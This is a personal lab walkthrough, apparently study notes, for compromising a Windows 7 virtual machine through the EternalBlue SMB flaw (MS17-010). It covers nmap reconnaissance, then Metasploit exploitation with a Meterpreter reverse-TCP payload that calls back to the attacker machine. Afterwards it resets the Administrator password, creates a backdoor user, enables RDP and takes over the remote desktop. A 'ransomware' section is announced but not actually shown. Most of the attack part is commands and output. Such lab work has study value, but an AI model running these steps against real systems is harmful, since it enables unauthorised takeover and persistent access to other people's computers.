# Eternal Blue

Windows 7 VM -> SMB exploit -> change admin passwd and do [wannacry](https://www.kaspersky.co.in/resource-center/threats/ransomware-wannacry)

## Step 0

`sudo su`

## Step 1: Find IP

1. `ifconfig`

    ```
    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 192.168.110.131  netmask 255.255.255.0  broadcast 192.168.110.255
            inet6 fe80::20c:29ff:fe74:24c3  prefixlen 64  scopeid 0x20<link>
            ether 00:0c:29:74:24:c3  txqueuelen 1000  (Ethernet)
            RX packets 230  bytes 22906 (22.3 KiB)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 47  bytes 4684 (4.5 KiB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
            inet 127.0.0.1  netmask 255.0.0.0
            inet6 ::1  prefixlen 128  scopeid 0x10<host>
            loop  txqueuelen 1000  (Local Loopback)
            RX packets 8  bytes 400 (400.0 B)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 8  bytes 400 (400.0 B)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
    ```

    My IP --> `192.168.110.131`

2. `nmap -sP 192.168.110.1/24`

    ```
    starting Nmap 7.92 ( https://nmap.org ) at 2021-12-16 08:48 EST
    Nmap scan report for 192.168.110.2
    Host is up (0.0017s latency).
    Nmap scan report for 192.168.110.131
    Host is up (0.00048s latency).
    Nmap scan report for 192.168.110.133
    Host is up (0.0075s latency).
    Nmap done: 256 IP addresses (3 hosts up) scanned in 2.75 seconds
    ```

    Possible IP : `192.168.110.2`, `192.168.110.133`

    `192.168.110.2` -> VMware NAT router

    so windows IP -> `192.168.110.133`

3. `nmap -sV 192.168.110.133`

    ```
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-16 08:50 EST
    Nmap scan report for 192.168.110.133
    Host is up (0.0011s latency).
    Not shown: 991 closed tcp ports (conn-refused)
    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49156/tcp open  msrpc        Microsoft Windows RPC
    49157/tcp open  msrpc        Microsoft Windows RPC
    Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 61.45 seconds
    ```

    confirm windows IP is `192.168.110.133`

    !!SMB ports 139 and 455 are open
    !!135 -> default Windows RPC

    [More Info](https://www.google.com/search?q=smb+port&oq=smb+port&aqs=edge.0.0i433i512j0i512j0i131i433i512j0i512l5j69i64.1597j0j1&sourceid=chrome&ie=UTF-8)

    [More about RPC](https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page)

## Optional Step 1.1: Windows specific way of finding

1. `nbtscan 192.168.68.1/24`

    - nbtscan -> only netbios -> only SMB Port (hence windows specific)

    ```
    Doing NBT name scan for addresses from 192.168.110.1/24

    IP address       NetBIOS Name     Server    User             MAC address
    ------------------------------------------------------------------------------
    192.168.110.133  WIN-845Q99OO4PP  <server>  <unknown>        00:0c:29:a2:0d:8b
    192.168.110.255 Sendto failed: Permission denied

    ```

## Optional Step 1.2: Deep Scan

1. `nmap -p- -A 192.168.110.133 --open`

-p- => deep scan all the ip (-sV does only "upar upar" se)
-A => All the information possible about the scan (full verbose mode)
--open => some port might be active but not open (and hence not accessible) => hence we only want open port => this is a filter

    ```
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-16 09:22 EST
    Nmap scan report for 192.168.110.133
    Host is up (0.0035s latency).
    Not shown: 65484 closed tcp ports (reset), 42 filtered tcp ports (no-response)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49156/tcp open  msrpc        Microsoft Windows RPC
    49157/tcp open  msrpc        Microsoft Windows RPC
    MAC Address: 00:0C:29:A2:0D:8B (VMware)
    Device type: general purpose
    Running: Microsoft Windows 7|2008|8.1
    OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
    OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
    Network Distance: 1 hop
    Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time:
    |   date: 2021-12-16T14:23:24
    |_  start_date: 2021-12-16T13:36:38
    | smb-os-discovery:
    |   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1
    |   Computer name: WIN-845Q99OO4PP
    |   NetBIOS computer name: WIN-845Q99OO4PP\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2021-12-16T09:23:24-05:00
    | smb2-security-mode:
    |   2.1:
    |_    Message signing enabled but not required
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:a2:0d:8b (VMware)
    |_clock-skew: mean: 1h39m43s, deviation: 2h53m12s, median: -16s

    TRACEROUTE
    HOP RTT     ADDRESS
    1   3.46 ms 192.168.110.133

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 85.99 seconds
    ```

Some port opens only when some data is being transferred, then immediatyl close once data is passed, those ports are active but closed

Eg: windows games like FH4, Halo uses a port for it

IMP - Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1) - smb2-security-mode -> 2.1 (smb2)

## Step 2: Find Exploit

1. Google `SMB2 exploit` and explore
2. MORE INFO: `nmap --script vuln 192.168.110.133`

    - inbuilt nmap inbuilt script to check for vulnerability in the given ip
    - nmap has an awesome set of scripts, you can get them by `locate *.nse`these are
      exploits wrritten by hackers to check if the IP port is vuln
    - it's called swiss army knife of networking for a reason

    ```
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-16 09:32 EST
    Nmap scan report for 192.168.110.133
    Host is up (0.00072s latency).
    Not shown: 991 closed tcp ports (reset)
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49156/tcp open  unknown
    49157/tcp open  unknown
    MAC Address: 00:0C:29:A2:0D:8B (VMware)

    Host script results:
    | smb-vuln-ms17-010:
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND

    Nmap done: 1 IP address (1 host up) scanned in 110.52 seconds
    ```

    So -> google `CVE:CVE-2017-0143` and `smb-vuln-ms17-010`

    [rapid7 link](https://www.rapid7.com/db/vulnerabilities/msft-cve-2017-0143/#:~:text=A%20remote%20code%20execution%20vulnerability,code%20on%20the%20target%20server.)

    [microsoft docs](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)

## Step 3: Exploit

1. `msfconsole`
2. `search ms17`

    ```
    Matching Modules
    ================

    #   Name                                                   Disclosure Date  Rank     Check  Description
    -   ----                                                   ---------------  ----     -----  -----------
    0   exploit/windows/smb/ms17_010_eternalblue               2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
    1   exploit/windows/smb/ms17_010_psexec                    2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
    2   auxiliary/admin/smb/ms17_010_command                   2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
    3   auxiliary/scanner/smb/smb_ms17_010                                      normal   No     MS17-010 SMB RCE Detection
    4   exploit/windows/fileformat/office_ms17_11882           2017-11-15       manual   No     Microsoft Office CVE-2017-11882
    5   auxiliary/admin/mssql/mssql_escalate_execute_as                         normal   No     Microsoft SQL Server Escalate EXECUTE AS
    6   auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                    normal   No     Microsoft SQL Server SQLi Escalate Execute AS
    7   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                   normal   No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
    8   auxiliary/admin/mssql/mssql_enum_sql_logins                             normal   No     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
    9   auxiliary/admin/mssql/mssql_enum_domain_accounts                        normal   No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
    10  exploit/windows/smb/smb_doublepulsar_rce               2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


    Interact with a module by name or index. For example info 10, use 10 or use exploit/windows/smb/smb_doublepulsar_rce
    ```

3.  search for vulnerability

    1. `use 3`

    metasploit has vulnreability checker, we are using it to find what exploit can ve used

    2. `show options`

        ```
        Module options (auxiliary/scanner/smb/smb_ms17_010):

        Name         Current Setting                  Required  Description
        ----         ---------------                  --------  -----------
        CHECK_ARCH   true                             no        Check for architecture on vulnerable hosts
        CHECK_DOPU   true                             no        Check for DOUBLEPULSAR on vulnerable hosts
        CHECK_PIPE   false                            no        Check for named pipe on vulnerable hosts
        NAMED_PIPES  /usr/share/metasploit-framework  yes       List of named pipes to check
                        /data/wordlists/named_pipes.txt
        RHOSTS                                        yes       The target host(s), see https://github.com/rapid7/meta
                                                                sploit-framework/wiki/Using-Metasploit
        RPORT        445                              yes       The SMB service port (TCP)
        SMBDomain    .                                no        The Windows domain to use for authentication
        SMBPass                                       no        The password for the specified username
        SMBUser                                       no        The username to authenticate as
        THREADS      1                                yes       The number of concurrent threads (max one per host)
        ```

    3. `set RHOSTS 192.168.110.133`
    4. `run`
        ```
            [+] 192.168.110.133:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
            [*] 192.168.110.133:445   - Scanned 1 of 1 hosts (100% complete)
            [*] Auxiliary module execution completed
        ```
        - now we are confirmed that the computer is vurnerable

4.  now we exploit

    1. `back` (deselect the selected auxiliary)
    2. `search ms17-010`

        ```
                Matching Modules
        ================

        #  Name                                      Disclosure Date  Rank     Check  Description
        -  ----                                      ---------------  ----     -----  -----------
        0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
        1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
        2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
        3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
        4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


        Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce


        ```

    3. `use 0`
        - payload will be auto selected
    4. `show options`

        ```
                Module options (exploit/windows/smb/smb_doublepulsar_rce):

            Name    Current Setting  Required  Description
            ----    ---------------  --------  -----------
            RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Us
                                                ing-Metasploit
            RPORT   445              yes       The SMB service port (TCP)


            Payload options (windows/x64/meterpreter/reverse_tcp):

            Name      Current Setting  Required  Description
            ----      ---------------  --------  -----------
            EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
            LHOST                      yes       The listen address (an interface may be specified)
            LPORT     4444             yes       The listen port


            Exploit target:

            Id  Name
            --  ----
            0   Execute payload (x64)

        ```

    5. `show info` -> know about the exploit (used in report writing)
    6. `set RHOSTS 192.168.110.133`
    7. `show options`

        ```
        Module options (exploit/windows/smb/ms17_010_eternalblue):

        Name           Current Setting  Required  Description
        ----           ---------------  --------  -----------
        RHOSTS         192.168.110.133  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                    wiki/Using-Metasploit
        RPORT          445              yes       The target port (TCP)
        SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects W
                                                    indows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                                    chines.
        SMBPass                         no        (Optional) The password for the specified username
        SMBUser                         no        (Optional) The username to authenticate as
        VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windo
                                                    ws Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machin
                                                    es.
        VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
                                                    2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


        Payload options (windows/x64/meterpreter/reverse_tcp):

        Name      Current Setting  Required  Description
        ----      ---------------  --------  -----------
        EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
        LHOST     192.168.110.131  yes       The listen address (an interface may be specified)
        LPORT     4444             yes       The listen port


        Exploit target:

        Id  Name
        --  ----
        0   Automatic Target


        ```

    8. check if LPORT is not below 3000 (better if in range 3000 to 5000)
    9. `exploit`

## What are we doing

This exploit uses buffer overflow to get access [more here](https://research.checkpoint.com/2017/eternalblue-everything-know/)

## Step 4: inside windows

1. `shell` -> open cmd
2. `whoami` -> nt authority\system (the admin) (this exploit direct gives admin)
    - two types of user in windows -> admin and user
3. `net user Administrator hello123` -> change password to "hello123"

## step 5: ransomware
1. `exit` -> exit from the windows access
2. `help` -> all the things you can do
3. `screenshare` -> link generated -> watch in browser -> Ctrl + C to exit
4.  control the computer
    1.`ps`

    ```
        Process List
        ============

        PID   PPID  Name               Arch  Session  User                           Path
        ---   ----  ----               ----  -------  ----                           ----
        0     0     [System Process]
        4     0     System             x64   0
        208   440   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
        228   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM            \SystemRoot\System32\smss.exe
        300   284   csrss.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\csrss.exe
        312   440   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
        348   284   wininit.exe        x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\wininit.exe
        360   340   csrss.exe          x64   1        NT AUTHORITY\SYSTEM            C:\Windows\system32\csrss.exe
        388   340   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM            C:\Windows\system32\winlogon.exe
        440   348   services.exe       x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\services.exe
        456   348   lsass.exe          x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\lsass.exe
        464   348   lsm.exe            x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\lsm.exe
        572   440   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
        652   440   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
        728   440   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
        792   440   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
        824   440   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
        880   440   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM            C:\Windows\System32\spoolsv.exe
        964   440   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
        1056  440   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM
        1208  660   explorer.exe       x64   1        WIN-845Q99OO4PP\Administrator  C:\Windows\Explorer.EXE
        1464  440   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
        1472  440   taskhost.exe       x64   1        WIN-845Q99OO4PP\Administrator  C:\Windows\system32\taskhost.exe
        1540  792   dwm.exe            x64   1        WIN-845Q99OO4PP\Administrator  C:\Windows\system32\Dwm.exe
        1852  440   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
        1892  440   sppsvc.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
    ```
    2. `channel 440` (PPID of svchost)
    4. `getdesktop` -> create a session for remote desctop
    3. `run getgui -u abhiroop -p qwerty` -> make a user
    4. you might need to run "windows/manage/enable_rdp" to enable rdp
        -   `bg` a meterpreter session to shift it to backgroud
        -   `show sessions` to show all running sessions 
        -   `session <session_id>` to go back to the session you backgrounded
    5. make a new terminal window and `rdesktop -u abhiroop -p qwerty 192.168.110.133` -> now you have remote desktop access